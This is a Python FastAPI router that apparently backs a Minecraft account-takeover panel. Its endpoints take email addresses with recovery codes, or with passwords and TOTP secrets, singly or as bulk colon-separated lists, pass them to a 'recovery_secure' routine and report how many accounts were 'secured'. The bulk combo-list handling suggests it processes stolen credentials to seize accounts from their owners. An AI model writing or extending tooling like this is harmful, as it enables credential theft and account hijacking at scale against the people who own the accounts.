from fastapi import APIRouter, Depends, HTTPException
from web.config import require_auth
from web.models import RecoveryRequest, PasswordRequest, BulkRequest
from securing.recovery_secure import recovery_secure

router = APIRouter()

@router.post("/api/secure/recovery")
async def secure_recovery(body: RecoveryRequest, user: str = Depends(require_auth)):
    from securing.recovery_secure import recovery_secure
    try:

        result = await recovery_secure(body.email, "rcode", {"recovery_code": body.recovery_code})
        if result is None:
            raise HTTPException(400, detail="Invalid Recovery Code")
        
        if isinstance(result, dict) and "error" in result:
            raise HTTPException(400, detail=result["error"])
        
        mc = result["minecraft"]
        return {
            "status": "secured", 
            "mc_name": mc["name"]
        }
    
    except HTTPException:
        raise

    except Exception as e:
        if "ServerData" in str(e) or "no attribute" in str(e).lower():
            raise HTTPException(400, detail="This email does not exist")
        
        raise HTTPException(400, detail="Invalid Recovery Code")

@router.post("/api/secure/password")
async def secure_password(body: PasswordRequest, user: str = Depends(require_auth)):
    result = await recovery_secure(
        email = body.email, 
        type = "authpwd", 
        data = {
            "password": body.password,
            "auth_secret": body.totp_secret
        }
    )

    if not result:
        raise HTTPException(400, "Failed to secure account.")
    
    mc = result["minecraft"]
    return {
        "status": "secured", 
        "mc_name": mc["name"]
    }

@router.post("/api/secure/recovery-bulk")
async def secure_recovery_bulk(body: BulkRequest, user: str = Depends(require_auth)):
    secured, failed = 0, 0

    for entry in body.entries:
        parts = entry.split(":")
        if len(parts) != 2:
            failed += 1
            continue

        result = await recovery_secure(parts[0].strip(), "rcode", {"recovery_code": parts[1].strip()})
        if result:
            secured += 1
        else:
            failed += 1

    return {
        "secured": secured, 
        "failed": failed
    }


@router.post("/api/secure/password-bulk")
async def secure_password_bulk(body: BulkRequest, user: str = Depends(require_auth)):
    secured, failed = 0, 0

    for entry in body.entries:
        parts = entry.split(":")

        if len(parts) != 3:
            failed += 1
            continue

        result = await recovery_secure(
            email = parts[0].strip(), 
            type = "authpwd", 
            data = {
                "password": parts[1].strip(), 
                "auth_secret": parts[2].strip()
            }
        )
        
        if result:
            secured += 1
        else:
            failed += 1

    return {
        "secured": secured, 
        "failed": failed
    }
